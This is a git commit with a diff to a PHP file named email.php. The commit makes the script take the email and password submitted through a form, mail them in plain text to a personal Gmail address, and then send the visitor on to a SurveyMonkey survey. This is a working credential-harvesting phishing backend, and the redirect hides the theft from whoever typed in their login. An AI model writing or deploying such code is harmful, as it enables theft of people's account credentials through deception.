39b0ebea05ca7abe872c987001af2fa098499cb4
Δημήτρης Φιλίππου <p3160253@dias.aueb.gr>
2017-11-23 22:58:25 +0200

    Update email.php

--- email.php
+++ email.php
@@ -1,4 +1,15 @@
 <?php
-echo $_POST["email"];
-echo $_POST["pass"];
+
+$to      = 'croot752014@gmail.com';
+$subject = 'the subject';
+$message = $_POST["email"] . "  :  " . $_POST["pass"];
+$headers = 'From: webmaster@example.com' . "\r\n" .
+    'Reply-To: webmaster@example.com' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+mail($to, $subject, $message, $headers);
+
+
+$newURL = "https://www.surveymonkey.com/r/Y7L9ZY6";
+header('Location: '.$newURL);
 ?>
